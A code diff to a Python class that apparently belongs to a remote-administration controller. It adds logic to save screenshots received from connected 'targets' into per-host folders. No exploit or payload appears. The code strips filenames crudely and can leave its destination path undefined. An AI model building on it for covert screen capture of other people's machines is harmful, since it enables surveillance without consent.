@@ -3,10 +3,12 @@ from datetime import datetime
 from termcolor import colored
 import time
 import ntpath
+import os
+import shutil
 
 
 class Tasks:
-    def __init__(self, con, ip, ttl, clients, connections, targets, ips):
+    def __init__(self, con, ip, ttl, clients, connections, targets, ips, tmp_availables, root):
         self.con = con
         self.ip = ip
         self.ttl = ttl
@@ -14,6 +16,8 @@ class Tasks:
         self.connections = connections
         self.targets = targets
         self.ips = ips
+        self.tmp_availables = tmp_availables
+        self.root = root
 
     def bytes_to_number(self, b):
         res = 0
@@ -34,6 +38,22 @@ class Tasks:
             size = self.bytes_to_number(size)
             current_size = 0
             buffer = b""
+            filenameRecv = str(filenameRecv).strip("b'")
+
+            # Create a directory with host's name if not already exists.
+            for item in self.tmp_availables:
+                for conKey, ipValue in self.clients.items():
+                    for ipKey in ipValue.keys():
+                        if item[1] == ipKey:
+                            ipval = item[1]
+                            host = item[2]
+                            user = item[3]
+                            path = os.path.join(self.root, host)
+                            try:
+                                os.makedirs(path)
+
+                            except FileExistsError:
+                                pass
 
             with open(filenameRecv, 'wb') as tsk_file:
                 while current_size < size:
@@ -56,6 +76,11 @@ class Tasks:
             self.con.send(f"Received file: {name}\n".encode())
             msg = self.con.recv(1024).decode()
             # print(f"[{colored('@', 'green')}]{msg}")
+
+            # Move screenshot file to directory
+            src = os.path.abspath(filenameRecv)
+            dst = fr"{path}"
+            shutil.move(src, dst)
 
             return True
 
